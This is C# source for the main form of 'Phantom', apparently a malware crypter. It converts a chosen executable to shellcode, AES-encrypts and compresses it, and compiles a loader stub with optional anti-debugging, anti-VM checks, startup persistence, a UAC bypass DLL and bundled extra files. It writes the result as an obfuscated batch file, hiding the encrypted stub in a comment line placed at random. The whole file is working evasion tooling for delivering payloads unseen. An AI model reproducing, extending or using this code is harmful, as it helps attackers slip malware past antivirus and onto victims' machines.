using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;
using Microsoft.CSharp;
using Phantom.Properties;
using static Phantom.Utils;

namespace Phantom
{
    public partial class PhantomMain : Form
    {
        public PhantomMain()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null)
            {
                UnpackSettings(obj);
            }
            Task.Factory.StartNew(CheckVersion);
            UpdateKeys(sender, e);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(-1);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = @"Executable Files (*.exe)|*.exe";
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            textBox1.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e) => Crypt();

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = @"Executable/Batch Files (*.exe, *.bat)|*.exe;*.bat";
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            listBox1.Items.Add(ofd.FileName);
        }

        private static string CreateTempFile(Random rng)
        {
            string tempfilename = Utils.RandomString(10, rng) + @".tmp";
            File.WriteAllText(tempfilename, @"");
            return tempfilename;
        }

        private static byte[] ExtractResource(String filename)
        {
            System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(filename))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        internal enum FileType
        {
            x64,
            x86,
            NET64,
            NET86,
            Invalid
        }

        private static FileType GetFileType(string path)
        {
            FileType result;
            try
            {
                result = ((AssemblyName.GetAssemblyName(path).ProcessorArchitecture == ProcessorArchitecture.X86) ? FileType.NET86 : FileType.NET64);
            }
            catch
            {
                using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read))
                {
                    using (BinaryReader binaryReader = new BinaryReader(fileStream))
                    {
                        try
                        {
                            fileStream.Seek(60L, SeekOrigin.Begin);
                            int num = binaryReader.ReadInt32();
                            fileStream.Seek((long)num, SeekOrigin.Begin);
                            bool flag = binaryReader.ReadUInt32() != 17744U;
                            if (flag)
                            {
                                throw new Exception();
                            }
                            result = ((binaryReader.ReadUInt16() == 332) ? FileType.x86 : FileType.x64);
                        }
                        catch
                        {
                            result = FileType.Invalid;
                        }
                    }
                }
            }
            return result;
        }

        // Method to create a crypted batch file from a executable
        private void Crypt()
        {
            // Disable button to prevent multiple executions
            buildButton.Enabled = false;

            // Switch to the output tab
            tabControl1.SelectedTab = tabControl1.TabPages[@"outputPage"];

            // Clear items from listBox2
            listBox2.Items.Clear();

            // Call UpdateKeys method with null arguments to update and refresh the AES keys
            UpdateKeys(null, null);

            // Initialize a random number generator
            Random rng = new Random();

            // Retrieve input from textBox1
            string _input = textBox1.Text;

            // Decode keys and initialization vectors from base64 strings
            byte[] _key = Convert.FromBase64String(key1), _iv = Convert.FromBase64String(iv1), _stubkey = Convert.FromBase64String(key2), _stubiv = Convert.FromBase64String(iv6);

            // Specify encryption mode
            EncryptionMode mode = EncryptionMode.AES;

            // Check if input file doesn't exist or is not an executable
            if (!File.Exists(_input) || Path.GetExtension(_input) != @".exe")
            {
                // Show error message
                MessageBox.Show(!File.Exists(_input) ? @"Invalid input path." : @"Invalid input file.", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                // Re-enable build button
                buildButton.Enabled = true;

                // Exit function
                return;
            }

            // Read bytes from input file
            byte[] pbytes = File.ReadAllBytes(_input);

            bool isnetasm = false;

            // Check the file type of the input file
            FileType fileType = GetFileType(_input);
            if (fileType == FileType.Invalid)
            {
                // Show error message
                MessageBox.Show(@"Invalid input file.", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                // Exit function
                return;
            }
            else if (fileType == FileType.NET64 || fileType == FileType.NET86)
            {
                isnetasm = true;
            }

            // If input file is not a .NET assembly, convert it to shellcode and update the payload byte array
            if (!isnetasm)
            {
                listBox2.Items.Add(@"[Native Payload Detected] - Converting payload to shellcode...");
                int archType = 0;
                if (fileType == FileType.x64)
                {
                    archType = 2;
                }
                else
                {
                    archType = 1;
                }
                string payloadExtension = Path.GetExtension(_input);
                File.WriteAllBytes($"payload_native{payloadExtension}", pbytes);
                File.WriteAllBytes(@"donut.exe", ExtractResource(@"Phantom.Resources.donut.exe"));
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.UseShellExecute = true;
                processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                processStartInfo.FileName = @"cmd.exe";
                processStartInfo.Arguments = $"/C donut.exe -a {archType} -o \"payload_native.bin\" -i \"payload_native{payloadExtension}\" -b 1 -k 2 -x 3 & exit";
                Process.Start(processStartInfo).WaitForExit();
                File.Delete(@"donut.exe");
                File.Delete($"payload_native{payloadExtension}");
                pbytes = File.ReadAllBytes(@"payload_native.bin");
                File.Delete(@"payload_native.bin");
            }

            // Add message to listBox2
            listBox2.Items.Add(@"Encrypting payload...");

            // Encrypt and compress payload
            byte[] payload_enc = Encrypt(mode, Compress(pbytes), _stubkey, _stubiv);

            // Add message to listBox2
            listBox2.Items.Add(@"Creating stub...");

            // Generate C# stub code
            string stub = StubGen.CreateCS(_stubkey, _stubiv, mode, antiDebug.Checked, antiVM.Checked, startup.Checked, uacBypass.Checked, !isnetasm, rng);

            // Add message to listBox2
            listBox2.Items.Add(@"Building stub...");

            // Create temporary file
            string tempfile = CreateTempFile(rng);

            // Write payload to file
            File.WriteAllBytes(@"payload.exe", payload_enc);

            // Initialize C# code provider
            CSharpCodeProvider csc = new CSharpCodeProvider();

            // Specify compiler parameters (Stager Stub)
            CompilerParameters parameters = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll", @"System.Windows.Forms.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = @"-optimize -unsafe",
                IncludeDebugInformation = false
            };

            // Add embedded resources to compiler parameters
            parameters.EmbeddedResources.Add(@"payload.exe");
            if (uacBypass.Checked)
            {
                if (fileType == FileType.NET64 || fileType == FileType.x64)
                {
                    File.WriteAllBytes(@"UAC", Compress(ExtractResource(@"Phantom.Resources.UAC64.dll")));
                }
                else
                {
                    File.WriteAllBytes(@"UAC", Compress(ExtractResource(@"Phantom.Resources.UAC.dll")));
                }
                parameters.EmbeddedResources.Add(@"UAC");
            }
            foreach (string item in listBox1.Items)
            {
                parameters.EmbeddedResources.Add(item);
            }

            // Compile stub code
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);

            // Check for compilation errors
            if (results.Errors.Count > 0)
            {
                // Delete temporary files
                File.Delete(@"payload.txt");
                File.Delete(tempfile);
                if (uacBypass.Checked)
                {
                    File.Delete(@"UAC");
                }

                // Show error message
                MessageBox.Show(@"Stager Stub build error!", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                // Re-enable build button
                buildButton.Enabled = true;

                // Exit function
                return;
            }

            // Read bytes from temporary file
            byte[] stubbytes = File.ReadAllBytes(tempfile);

            // Delete temporary files
            File.Delete(@"payload.exe");
            File.Delete(tempfile);
            if (uacBypass.Checked)
            {
                File.Delete(@"UAC");
            }

            // Create another temporary file
            tempfile = CreateTempFile(rng);

            // Initialize another C# code provider
            CSharpCodeProvider csc2 = new CSharpCodeProvider();

            // Specify compiler parameters for second compilation (Bypass Stub)
            CompilerParameters parameters2 = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = @"-optimize -unsafe",
                IncludeDebugInformation = false
            };

            // Compile embedded BStub.cs file
            string BStub_Str = GetEmbeddedString(@"Phantom.Resources.BStub.cs");
            if (fileType == FileType.NET64)
            {
                BStub_Str = "#define x64\n" + BStub_Str;
            }
            else if (fileType == FileType.x64)
            {
                BStub_Str = "#define x64\n" + BStub_Str;
            }
            CompilerResults results2 = csc2.CompileAssemblyFromSource(parameters2, BStub_Str);

            // Check for compilation errors
            if (results2.Errors.Count > 0)
            {
                // Delete temporary files
                File.Delete(@"payload.txt");
                File.Delete(tempfile);

                // Show error message
                MessageBox.Show(@"BStub build error!", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                // Re-enable build button
                buildButton.Enabled = true;

                // Exit function
                return;
            }

            // Encrypt and compress stub bytes
            byte[] bstubbytes = Encrypt(mode, Compress(File.ReadAllBytes(tempfile)), _key, _iv);

            // Delete temporary files
            File.Delete(@"payload.exe");
            File.Delete(tempfile);

            // Add message to listBox2
            listBox2.Items.Add(@"Encrypting stub...");

            // Encrypt and compress stub bytes
            byte[] stub_enc = Encrypt(mode, Compress(stubbytes), _key, _iv);

            // Add message to listBox2
            listBox2.Items.Add(@"Creating batch file...");

            // Generate batch file content
            string content = FileGen.CreateBat(_key, _iv, mode, hidden.Checked, selfDelete.Checked, runas.Checked, fileType, rng);

            // Split content into lines
            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));

            // Insert encrypted stub bytes into content lines at random position
            content_lines.Insert(rng.Next(0, content_lines.Count), $":: {Convert.ToBase64String(bstubbytes)}\\{Convert.ToBase64String(stub_enc)}");
            content = string.Join(Environment.NewLine, content_lines);

            // Initialize SaveFileDialog
            SaveFileDialog sfd = new SaveFileDialog()
            {
                AddExtension = true,
                DefaultExt = @"bat",
                Title = @"Save File",
                Filter = @"Batch files (*.bat)|*.bat",
                RestoreDirectory = true,
                FileName = Path.ChangeExtension(_input, @"bat")
            };

            // If file dialog result is OK
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                // Add message to listBox2
                listBox2.Items.Add(@"Writing output...");

                // Write content to selected file
                File.WriteAllText(sfd.FileName, content, Encoding.ASCII);

                // Show success message
                MessageBox.Show(@"Done!", @"Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }

            // Re-enable build button
            buildButton.Enabled = true;
        }

        private void CheckVersion()
        {
            try
            {
                WebClient wc = new WebClient();
                string latestversion = wc.DownloadString("https://raw.githubusercontent.com/C5Hackr/Phantom/main/version").Trim();
                wc.Dispose();
                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion"))
                {
                    string currentversion = File.ReadAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion").Trim();
                    if (currentversion != latestversion)
                    {
                        DialogResult result = MessageBox.Show($"Phantom {currentversion} is outdated. Download {latestversion}?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation);
                        if (result == DialogResult.Yes)
                        {
                            Process.Start("https://github.com/C5Hackr/Phantom/releases/tag/" + latestversion);
                        }
                    }
                }
                File.WriteAllText(AppDomain.CurrentDomain.BaseDirectory + "\\bin\\latestversion", latestversion);
            }
            catch
            {
            }
        }

        private static string key1 = @"";

        private static string iv1 = @"";

        private static string key2 = @"";

        private static string iv6 = @"";

        private void UpdateKeys(object sender, EventArgs e)
        {
            AesManaged aes = new AesManaged();
            key1 = Convert.ToBase64String(aes.Key);
            iv1 = Convert.ToBase64String(aes.IV);
            aes.Dispose();
            aes = new AesManaged();
            key2 = Convert.ToBase64String(aes.Key);
            iv6 = Convert.ToBase64String(aes.IV);
            aes.Dispose();
        }

        private void UnpackSettings(SettingsObject obj)
        {
            textBox1.Text = obj.inputFile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            selfDelete.Checked = obj.selfDelete;
            hidden.Checked = obj.hidden;
            runas.Checked = obj.runas;
            startup.Checked = obj.startup;
            uacBypass.Checked = obj.uacBypass;
            try
            {
                listBox1.Items.AddRange(obj.bindedFiles);
            }
            catch
            {
            }
        }

        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                inputFile = textBox1.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                selfDelete = selfDelete.Checked,
                hidden = hidden.Checked,
                runas = runas.Checked,
                startup = startup.Checked,
                uacBypass = uacBypass.Checked,
            };
            List<string> paths = new List<string>();
            foreach (string item in listBox1.Items)
            {
                paths.Add(item);
            }
            obj.bindedFiles = paths.ToArray();
            return obj;
        }

        private void startup_CheckedChanged(object sender, EventArgs e)
        {
            if (startup.Checked)
            {
                selfDelete.Checked = false;
                selfDelete.Enabled = false;
            }
            else
            {
                if (!uacBypass.Checked)
                {
                    selfDelete.Enabled = true;
                }
            }
        }

        private void uacBypass_CheckedChanged(object sender, EventArgs e)
        {
            if (uacBypass.Checked)
            {
                selfDelete.Checked = false;
                selfDelete.Enabled = false;
            }
            else
            {
                if (!startup.Checked)
                {
                    selfDelete.Enabled = true;
                }
            }
        }
    }
}
